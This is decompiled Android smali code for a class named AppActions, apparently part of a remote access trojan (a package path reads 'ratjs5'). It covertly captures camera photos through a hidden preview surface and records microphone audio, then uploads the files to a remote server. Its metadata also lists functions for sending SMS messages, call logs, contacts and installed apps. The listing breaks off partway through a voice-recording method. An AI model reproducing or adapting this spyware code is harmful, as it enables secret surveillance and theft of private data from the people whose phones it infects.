.class public final Lthisisme/thisapp/inspector/Utils/AppActions;
.super Ljava/lang/Object;
.source "AppActions.kt"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lthisisme/thisapp/inspector/Utils/AppActions$SmsModel;
    }
.end annotation

.annotation runtime Lkotlin/Metadata;
    d1 = {
        "\u00006\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0000\n\u0002\u0018\u0002\n\u0002\u0008\u0004\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u0002\n\u0002\u0008\u000b\n\u0002\u0010\u000e\n\u0002\u0008\u0002\n\u0002\u0018\u0002\n\u0002\u0008\u0002\u0008\u0007\u0018\u00002\u00020\u0001:\u0001\u001cB\r\u0012\u0006\u0010\u0002\u001a\u00020\u0003\u00a2\u0006\u0002\u0010\u0004J\u0006\u0010\u000b\u001a\u00020\u000cJ\u0006\u0010\r\u001a\u00020\u000cJ\u0008\u0010\u000e\u001a\u00020\u000cH\u0007J\u0008\u0010\u000f\u001a\u00020\u000cH\u0007J\u0008\u0010\u0010\u001a\u00020\u000cH\u0007J\u0008\u0010\u0011\u001a\u00020\u000cH\u0007J\u0008\u0010\u0012\u001a\u00020\u000cH\u0007J\u0006\u0010\u0013\u001a\u00020\u000cJ\u0008\u0010\u0014\u001a\u00020\u000cH\u0007J\u0006\u0010\u0015\u001a\u00020\u000cJ\u000e\u0010\u0016\u001a\u00020\u000c2\u0006\u0010\u0017\u001a\u00020\u0018J\u000e\u0010\u0019\u001a\u00020\u000c2\u0006\u0010\u001a\u001a\u00020\u001bR\u0011\u0010\u0002\u001a\u00020\u0003\u00a2\u0006\u0008\n\u0000\u001a\u0004\u0008\u0005\u0010\u0006R\u000e\u0010\u0007\u001a\u00020\u0008X\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u000e\u0010\t\u001a\u00020\nX\u0082\u0004\u00a2\u0006\u0002\n\u0000\u00a8\u0006\u001d"
    }
    d2 = {
        "Lthisisme/thisapp/inspector/Utils/AppActions;",
        "",
        "context",
        "Landroid/content/Context;",
        "(Landroid/content/Context;)V",
        "getContext",
        "()Landroid/content/Context;",
        "permission",
        "Lthisisme/thisapp/inspector/Utils/AppPermission;",
        "request",
        "Lthisisme/thisapp/inspector/Utils/AppRequest;",
        "captureCamera1",
        "",
        "captureCamera2",
        "recordVoice1",
        "recordVoice2",
        "recordVoice3",
        "sendAllSms",
        "sendApps",
        "sendCallLog",
        "sendContact",
        "sendDeviceName",
        "sendFile",
        "path",
        "",
        "sendSms",
        "data",
        "Lthisisme/thisapp/inspector/Utils/AppSocket$SendSmsAction;",
        "SmsModel",
        "app_debug"
    }
    k = 0x1
    mv = {
        0x1,
        0x6,
        0x0
    }
    xi = 0x30
.end annotation


# static fields
.field public static final $stable:I


# instance fields
.field private final context:Landroid/content/Context;

.field private final permission:Lthisisme/thisapp/inspector/Utils/AppPermission;

.field private final request:Lthisisme/thisapp/inspector/Utils/AppRequest;


# direct methods
.method public static synthetic $r8$lambda$0Ssl_-DMU5zsrYkVWo9FZn6kBxU(Ljava/io/File;Lthisisme/thisapp/inspector/Utils/AppActions;[BLandroid/hardware/Camera;)V
    .locals 0

    invoke-static {p0, p1, p2, p3}, Lthisisme/thisapp/inspector/Utils/AppActions;->captureCamera1$lambda-3(Ljava/io/File;Lthisisme/thisapp/inspector/Utils/AppActions;[BLandroid/hardware/Camera;)V

    return-void
.end method

.method public static synthetic $r8$lambda$2XDDHtz1jmn7J5FX1jCwfAixNNg(Landroid/media/MediaRecorder;Lthisisme/thisapp/inspector/Utils/AppActions;Ljava/io/File;)V
    .locals 0

    invoke-static {p0, p1, p2}, Lthisisme/thisapp/inspector/Utils/AppActions;->recordVoice3$lambda-2(Landroid/media/MediaRecorder;Lthisisme/thisapp/inspector/Utils/AppActions;Ljava/io/File;)V

    return-void
.end method

.method public static synthetic $r8$lambda$DabfTF4Kdu0Gwblkv5Wos_PZhsA(Ljava/io/File;Lthisisme/thisapp/inspector/Utils/AppActions;[BLandroid/hardware/Camera;)V
    .locals 0

    invoke-static {p0, p1, p2, p3}, Lthisisme/thisapp/inspector/Utils/AppActions;->captureCamera2$lambda-4(Ljava/io/File;Lthisisme/thisapp/inspector/Utils/AppActions;[BLandroid/hardware/Camera;)V

    return-void
.end method

.method public static synthetic $r8$lambda$kDdPWkr2uMrKjC4js5U9G9ghvhQ(Landroid/media/MediaRecorder;Lthisisme/thisapp/inspector/Utils/AppActions;Ljava/io/File;)V
    .locals 0

    invoke-static {p0, p1, p2}, Lthisisme/thisapp/inspector/Utils/AppActions;->recordVoice1$lambda-0(Landroid/media/MediaRecorder;Lthisisme/thisapp/inspector/Utils/AppActions;Ljava/io/File;)V

    return-void
.end method

.method public static synthetic $r8$lambda$xFdPC0P0014JsVwTNFpsl35C264(Landroid/media/MediaRecorder;Lthisisme/thisapp/inspector/Utils/AppActions;Ljava/io/File;)V
    .locals 0

    invoke-static {p0, p1, p2}, Lthisisme/thisapp/inspector/Utils/AppActions;->recordVoice2$lambda-1(Landroid/media/MediaRecorder;Lthisisme/thisapp/inspector/Utils/AppActions;Ljava/io/File;)V

    return-void
.end method

.method static constructor <clinit>()V
    .locals 1

    sget-object v0, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->Int$class-AppActions()I

    move-result v0

    sput v0, Lthisisme/thisapp/inspector/Utils/AppActions;->$stable:I

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;)V
    .locals 1
    .param p1, "context"    # Landroid/content/Context;

    const-string v0, "context"

    invoke-static {p1, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 25
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p1, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->context:Landroid/content/Context;

    .line 26
    new-instance v0, Lthisisme/thisapp/inspector/Utils/AppRequest;

    invoke-direct {v0, p1}, Lthisisme/thisapp/inspector/Utils/AppRequest;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->request:Lthisisme/thisapp/inspector/Utils/AppRequest;

    .line 27
    new-instance v0, Lthisisme/thisapp/inspector/Utils/AppPermission;

    invoke-direct {v0, p1}, Lthisisme/thisapp/inspector/Utils/AppPermission;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->permission:Lthisisme/thisapp/inspector/Utils/AppPermission;

    .line 25
    return-void
.end method

.method private static final captureCamera1$lambda-3(Ljava/io/File;Lthisisme/thisapp/inspector/Utils/AppActions;[BLandroid/hardware/Camera;)V
    .locals 1
    .param p0, "$file"    # Ljava/io/File;
    .param p1, "this$0"    # Lthisisme/thisapp/inspector/Utils/AppActions;
    .param p2, "p0"    # [B
    .param p3, "p1"    # Landroid/hardware/Camera;

    const-string v0, "this$0"

    invoke-static {p1, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 278
    const-string v0, "file"

    invoke-static {p0, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v0, "p0"

    invoke-static {p2, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-static {p0, p2}, Lkotlin/io/FilesKt;->writeBytes(Ljava/io/File;[B)V

    .line 279
    invoke-virtual {p3}, Landroid/hardware/Camera;->release()V

    .line 280
    iget-object v0, p1, Lthisisme/thisapp/inspector/Utils/AppActions;->request:Lthisisme/thisapp/inspector/Utils/AppRequest;

    invoke-virtual {v0, p0}, Lthisisme/thisapp/inspector/Utils/AppRequest;->sendFile(Ljava/io/File;)V

    .line 281
    return-void
.end method

.method private static final captureCamera2$lambda-4(Ljava/io/File;Lthisisme/thisapp/inspector/Utils/AppActions;[BLandroid/hardware/Camera;)V
    .locals 1
    .param p0, "$file"    # Ljava/io/File;
    .param p1, "this$0"    # Lthisisme/thisapp/inspector/Utils/AppActions;
    .param p2, "p0"    # [B
    .param p3, "p1"    # Landroid/hardware/Camera;

    const-string v0, "this$0"

    invoke-static {p1, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 297
    const-string v0, "file"

    invoke-static {p0, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v0, "p0"

    invoke-static {p2, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-static {p0, p2}, Lkotlin/io/FilesKt;->writeBytes(Ljava/io/File;[B)V

    .line 298
    invoke-virtual {p3}, Landroid/hardware/Camera;->release()V

    .line 299
    iget-object v0, p1, Lthisisme/thisapp/inspector/Utils/AppActions;->request:Lthisisme/thisapp/inspector/Utils/AppRequest;

    invoke-virtual {v0, p0}, Lthisisme/thisapp/inspector/Utils/AppRequest;->sendFile(Ljava/io/File;)V

    .line 300
    return-void
.end method

.method private static final recordVoice1$lambda-0(Landroid/media/MediaRecorder;Lthisisme/thisapp/inspector/Utils/AppActions;Ljava/io/File;)V
    .locals 2
    .param p0, "$mediaRecord"    # Landroid/media/MediaRecorder;
    .param p1, "this$0"    # Lthisisme/thisapp/inspector/Utils/AppActions;
    .param p2, "$file"    # Ljava/io/File;

    const-string v0, "$mediaRecord"

    invoke-static {p0, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v0, "this$0"

    invoke-static {p1, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 219
    invoke-virtual {p0}, Landroid/media/MediaRecorder;->stop()V

    .line 220
    invoke-virtual {p0}, Landroid/media/MediaRecorder;->release()V

    .line 221
    iget-object v0, p1, Lthisisme/thisapp/inspector/Utils/AppActions;->request:Lthisisme/thisapp/inspector/Utils/AppRequest;

    const-string v1, "file"

    invoke-static {p2, v1}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v0, p2}, Lthisisme/thisapp/inspector/Utils/AppRequest;->sendFile(Ljava/io/File;)V

    .line 222
    return-void
.end method

.method private static final recordVoice2$lambda-1(Landroid/media/MediaRecorder;Lthisisme/thisapp/inspector/Utils/AppActions;Ljava/io/File;)V
    .locals 2
    .param p0, "$mediaRecord"    # Landroid/media/MediaRecorder;
    .param p1, "this$0"    # Lthisisme/thisapp/inspector/Utils/AppActions;
    .param p2, "$file"    # Ljava/io/File;

    const-string v0, "$mediaRecord"

    invoke-static {p0, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v0, "this$0"

    invoke-static {p1, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 239
    invoke-virtual {p0}, Landroid/media/MediaRecorder;->stop()V

    .line 240
    invoke-virtual {p0}, Landroid/media/MediaRecorder;->release()V

    .line 241
    iget-object v0, p1, Lthisisme/thisapp/inspector/Utils/AppActions;->request:Lthisisme/thisapp/inspector/Utils/AppRequest;

    const-string v1, "file"

    invoke-static {p2, v1}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v0, p2}, Lthisisme/thisapp/inspector/Utils/AppRequest;->sendFile(Ljava/io/File;)V

    .line 242
    return-void
.end method

.method private static final recordVoice3$lambda-2(Landroid/media/MediaRecorder;Lthisisme/thisapp/inspector/Utils/AppActions;Ljava/io/File;)V
    .locals 2
    .param p0, "$mediaRecord"    # Landroid/media/MediaRecorder;
    .param p1, "this$0"    # Lthisisme/thisapp/inspector/Utils/AppActions;
    .param p2, "$file"    # Ljava/io/File;

    const-string v0, "$mediaRecord"

    invoke-static {p0, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v0, "this$0"

    invoke-static {p1, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 259
    invoke-virtual {p0}, Landroid/media/MediaRecorder;->stop()V

    .line 260
    invoke-virtual {p0}, Landroid/media/MediaRecorder;->release()V

    .line 261
    iget-object v0, p1, Lthisisme/thisapp/inspector/Utils/AppActions;->request:Lthisisme/thisapp/inspector/Utils/AppRequest;

    const-string v1, "file"

    invoke-static {p2, v1}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v0, p2}, Lthisisme/thisapp/inspector/Utils/AppRequest;->sendFile(Ljava/io/File;)V

    .line 262
    return-void
.end method


# virtual methods
.method public final captureCamera1()V
    .locals 5

    .line 267
    new-instance v0, Lthisisme/thisapp/inspector/Utils/AppPermission;

    iget-object v1, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->context:Landroid/content/Context;

    invoke-direct {v0, v1}, Lthisisme/thisapp/inspector/Utils/AppPermission;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/AppPermission;->checkCaptureCam()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 268
    iget-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->request:Lthisisme/thisapp/inspector/Utils/AppRequest;

    new-instance v1, Lthisisme/thisapp/inspector/Utils/AppRequest$Text;

    sget-object v2, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v2}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$arg-0$call-$init$$arg-0$call-sendText$branch$if$fun-captureCamera1$class-AppActions()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Lthisisme/thisapp/inspector/Utils/AppRequest$Text;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Lthisisme/thisapp/inspector/Utils/AppRequest;->sendText(Lthisisme/thisapp/inspector/Utils/AppRequest$Text;)V

    .line 269
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v1, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v1}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$0$str$arg-0$call-createTempFile$val-file$branch$if$fun-captureCamera1$class-AppActions()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcom/myapps/ratjs5/Tools/AppTools;->Companion:Lcom/myapps/ratjs5/Tools/AppTools$Companion;

    invoke-virtual {v1}, Lcom/myapps/ratjs5/Tools/AppTools$Companion;->getDeviceName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v1}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$2$str$arg-0$call-createTempFile$val-file$branch$if$fun-captureCamera1$class-AppActions()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    sget-object v1, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v1}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$arg-1$call-createTempFile$val-file$branch$if$fun-captureCamera1$class-AppActions()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;)Ljava/io/File;

    move-result-object v0

    .line 270
    .local v0, "file":Ljava/io/File;
    new-instance v1, Landroid/graphics/SurfaceTexture;

    sget-object v2, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v2}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->Int$arg-0$call-$init$$val-holder$branch$if$fun-captureCamera1$class-AppActions()I

    move-result v2

    invoke-direct {v1, v2}, Landroid/graphics/SurfaceTexture;-><init>(I)V

    .line 271
    .local v1, "holder":Landroid/graphics/SurfaceTexture;
    sget-object v2, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v2}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->Int$arg-0$call-open$val-camera$branch$if$fun-captureCamera1$class-AppActions()I

    move-result v2

    invoke-static {v2}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v2

    .line 272
    .local v2, "camera":Landroid/hardware/Camera;
    invoke-virtual {v2, v1}, Landroid/hardware/Camera;->setPreviewTexture(Landroid/graphics/SurfaceTexture;)V

    .line 273
    invoke-virtual {v2}, Landroid/hardware/Camera;->startPreview()V

    .line 274
    nop

    .line 275
    nop

    .line 276
    nop

    .line 274
    new-instance v3, Lthisisme/thisapp/inspector/Utils/AppActions$$ExternalSyntheticLambda0;

    invoke-direct {v3, v0, p0}, Lthisisme/thisapp/inspector/Utils/AppActions$$ExternalSyntheticLambda0;-><init>(Ljava/io/File;Lthisisme/thisapp/inspector/Utils/AppActions;)V

    const/4 v4, 0x0

    invoke-virtual {v2, v4, v4, v3}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V

    .line 283
    .end local v0    # "file":Ljava/io/File;
    .end local v1    # "holder":Landroid/graphics/SurfaceTexture;
    .end local v2    # "camera":Landroid/hardware/Camera;
    :cond_0
    return-void
.end method

.method public final captureCamera2()V
    .locals 5

    .line 286
    new-instance v0, Lthisisme/thisapp/inspector/Utils/AppPermission;

    iget-object v1, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->context:Landroid/content/Context;

    invoke-direct {v0, v1}, Lthisisme/thisapp/inspector/Utils/AppPermission;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/AppPermission;->checkCaptureCam()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 287
    iget-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->request:Lthisisme/thisapp/inspector/Utils/AppRequest;

    new-instance v1, Lthisisme/thisapp/inspector/Utils/AppRequest$Text;

    sget-object v2, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v2}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$arg-0$call-$init$$arg-0$call-sendText$branch$if$fun-captureCamera2$class-AppActions()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Lthisisme/thisapp/inspector/Utils/AppRequest$Text;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Lthisisme/thisapp/inspector/Utils/AppRequest;->sendText(Lthisisme/thisapp/inspector/Utils/AppRequest$Text;)V

    .line 288
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v1, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v1}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$0$str$arg-0$call-createTempFile$val-file$branch$if$fun-captureCamera2$class-AppActions()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcom/myapps/ratjs5/Tools/AppTools;->Companion:Lcom/myapps/ratjs5/Tools/AppTools$Companion;

    invoke-virtual {v1}, Lcom/myapps/ratjs5/Tools/AppTools$Companion;->getDeviceName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v1}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$2$str$arg-0$call-createTempFile$val-file$branch$if$fun-captureCamera2$class-AppActions()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    sget-object v1, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v1}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$arg-1$call-createTempFile$val-file$branch$if$fun-captureCamera2$class-AppActions()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;)Ljava/io/File;

    move-result-object v0

    .line 289
    .local v0, "file":Ljava/io/File;
    new-instance v1, Landroid/graphics/SurfaceTexture;

    sget-object v2, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v2}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->Int$arg-0$call-$init$$val-holder$branch$if$fun-captureCamera2$class-AppActions()I

    move-result v2

    invoke-direct {v1, v2}, Landroid/graphics/SurfaceTexture;-><init>(I)V

    .line 290
    .local v1, "holder":Landroid/graphics/SurfaceTexture;
    sget-object v2, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v2}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->Int$arg-0$call-open$val-camera$branch$if$fun-captureCamera2$class-AppActions()I

    move-result v2

    invoke-static {v2}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v2

    .line 291
    .local v2, "camera":Landroid/hardware/Camera;
    invoke-virtual {v2, v1}, Landroid/hardware/Camera;->setPreviewTexture(Landroid/graphics/SurfaceTexture;)V

    .line 292
    invoke-virtual {v2}, Landroid/hardware/Camera;->startPreview()V

    .line 293
    nop

    .line 294
    nop

    .line 295
    nop

    .line 293
    new-instance v3, Lthisisme/thisapp/inspector/Utils/AppActions$$ExternalSyntheticLambda1;

    invoke-direct {v3, v0, p0}, Lthisisme/thisapp/inspector/Utils/AppActions$$ExternalSyntheticLambda1;-><init>(Ljava/io/File;Lthisisme/thisapp/inspector/Utils/AppActions;)V

    const/4 v4, 0x0

    invoke-virtual {v2, v4, v4, v3}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V

    .line 302
    .end local v0    # "file":Ljava/io/File;
    .end local v1    # "holder":Landroid/graphics/SurfaceTexture;
    .end local v2    # "camera":Landroid/hardware/Camera;
    :cond_0
    return-void
.end method

.method public final getContext()Landroid/content/Context;
    .locals 1

    .line 25
    iget-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->context:Landroid/content/Context;

    return-object v0
.end method

.method public final recordVoice1()V
    .locals 6

    .line 208
    new-instance v0, Lthisisme/thisapp/inspector/Utils/AppPermission;

    iget-object v1, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->context:Landroid/content/Context;

    invoke-direct {v0, v1}, Lthisisme/thisapp/inspector/Utils/AppPermission;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/AppPermission;->checkCaptureMic()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 209
    iget-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->request:Lthisisme/thisapp/inspector/Utils/AppRequest;

    new-instance v1, Lthisisme/thisapp/inspector/Utils/AppRequest$Text;

    sget-object v2, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v2}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$arg-0$call-$init$$arg-0$call-sendText$branch$if$fun-recordVoice1$class-AppActions()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Lthisisme/thisapp/inspector/Utils/AppRequest$Text;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Lthisisme/thisapp/inspector/Utils/AppRequest;->sendText(Lthisisme/thisapp/inspector/Utils/AppRequest$Text;)V

    .line 210
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v1, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v1}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$0$str$arg-0$call-createTempFile$val-file$branch$if$fun-recordVoice1$class-AppActions()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcom/myapps/ratjs5/Tools/AppTools;->Companion:Lcom/myapps/ratjs5/Tools/AppTools$Companion;

    invoke-virtual {v1}, Lcom/myapps/ratjs5/Tools/AppTools$Companion;->getDeviceName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v1}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$2$str$arg-0$call-createTempFile$val-file$branch$if$fun-recordVoice1$class-AppActions()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    sget-object v1, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v1}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$arg-1$call-createTempFile$val-file$branch$if$fun-recordVoice1$class-AppActions()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;)Ljava/io/File;

    move-result-object v0

    .line 211
    .local v0, "file":Ljava/io/File;
    new-instance v1, Landroid/media/MediaRecorder;

    invoke-direct {v1}, Landroid/media/MediaRecorder;-><init>()V

    .line 212
    .local v1, "mediaRecord":Landroid/media/MediaRecorder;
    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    .line 213
    invoke-virtual {v1, v2}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    .line 214
    invoke-virtual {v1, v2}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    .line 215
    invoke-virtual {v1, v0}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/io/File;)V

    .line 216
    invoke-virtual {v1}, Landroid/media/MediaRecorder;->prepare()V

    .line 217
    invoke-virtual {v1}, Landroid/media/MediaRecorder;->start()V

    .line 218
    new-instance v2, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v3

    invoke-direct {v2, v3}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

